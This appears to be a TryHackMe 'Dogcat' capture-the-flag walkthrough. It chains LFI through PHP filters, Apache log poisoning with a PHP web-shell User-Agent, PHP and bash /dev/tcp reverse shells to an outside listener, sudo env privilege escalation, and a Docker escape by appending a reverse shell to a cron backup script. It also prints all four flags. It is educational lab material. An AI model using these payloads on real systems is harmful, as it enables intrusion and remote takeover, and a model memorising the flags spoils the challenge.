# TryHackMe - Dogcat Walkthrough

## 📡 Task 1: Connect to the Network

---

## 🛠 Setup

Export the target IP address as an environment variable to simplify commands:

```bash
export IP=10.10.69.198
```

---

## 🔍 Nmap Scan

> ⚠️ Scanning all ports can take a long time.

Initial service enumeration:

```bash
nmap -sC -sV -oN nmap/initial $IP
```

**Nmap Results:**

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
```

---

## 📁 Directory Enumeration with Gobuster

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://$IP -x .php,.txt,.html
```

**Results:**

```
/.html       (Status: 403)
/index.php   (Status: 200)
/cat.php     (Status: 200)
/flag.php    (Status: 200)
/cats        (Status: 301)
/dogs        (Status: 301)
/dog.php     (Status: 200)
```

---

## 🪪 Reading `flag.php` via LFI with PHP Filter

Use the PHP filter wrapper to read source code in base64:

```
http://$IP/?view=php://filter/convert.base64-encode/resource=dog/../flag
```

**Base64 Output:**

```
PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=
```

Decode using CyberChef or:

```bash
echo 'PD9waHAK...' | base64 -d
```

**Decoded Output:**

```php
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
```

✅ **Flag 1:** `THM{Th1s_1s_N0t_4_Catdog_ab67edfa}`

---

## 🧠 Reviewing `index.php` Logic

Use the same filter to inspect `index.php`.

Interesting logic:

```php
$ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
...
if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
    include $_GET['view'] . $ext;
}
```

We can control the extension. Try reading system files:

```
http://$IP/?view=dog../../../../../etc/passwd&ext=
```

---

## 🔗 Local File Inclusion → Log Poisoning

Try reading the Apache access log:

```
http://$IP/?view=dog../../../../../var/log/apache2/access.log&ext=
```

### Inject PHP Code via User-Agent Header:

```bash
curl -A "<?php system($_GET['cmd']); ?>" http://$IP
```

Then access the log and execute commands:

```
http://$IP/?view=dog../../../../../var/log/apache2/access.log&ext=&cmd=ls
```

**Results:**

```
at.php
cats
dog.php
dogs
flag.php
index.php
style.css
```

---

## 🐚 Remote Code Execution via Reverse Shell

Initial attempts failed until realizing the shell needed to be URL-encoded.

Payload:

```php
php -r '$sock=fsockopen("10.6.57.243",8888);exec("/bin/sh -i <&3 >&3 2>&3");'
```

URL-encode using CyberChef or:

```
php%20-r%20%27%24sock%3Dfsockopen%28%2210.6.57.243%22%2C8888%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
```

Resulting in:

```bash
cat /var/www/flag2_QMW7JvaY2LvK.txt
```

✅ **Flag 2:** `THM{LF1_t0_RC3_aec3fb}`

---

## 🔓 Privilege Escalation with `sudo`

```bash
sudo -l
```

**Output:**

```
User www-data may run the following commands:
(root) NOPASSWD: /usr/bin/env
```

Use GTFOBins:

```bash
sudo env /bin/sh
id
```

**Result:**

```
uid=0(root) gid=0(root)
```

✅ **Root Access Achieved!**

```bash
cat /root/flag3.txt
```

✅ **Flag 3:** `THM{D1ff3r3nt_3nv1ronments_874112}`

---

## 🐳 Docker Escape

We’re in a Docker container (`.dockerenv` present).

Found backup script:

```bash
cat /opt/backups/backup.sh
```

**Output:**

```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

Append reverse shell:

```bash
echo "bash -i >& /dev/tcp/10.6.57.243/9999 0>&1" >> /opt/backups/backup.sh
```

Set up listener:

```bash
nc -lvnp 9999
```

💥 After a while, we get a shell on the host:

```bash
cat flag4.txt
```

✅ **Flag 4:** `THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}`

---

## 🧠 Final Thoughts

This was a tough challenge. Key takeaways:

- Deep understanding of LFI and PHP filters is crucial.
- Apache log poisoning → LFI → RCE is a powerful chain.
- Reverse shell payloads often require URL encoding.
- Privilege escalation required careful reading of `sudo -l` output.
- Docker escape involved persistence and creativity.

> I referenced a walkthrough briefly to verify I was on the right track—definitely learned a lot. Time to practice more LFI + RCE chains.
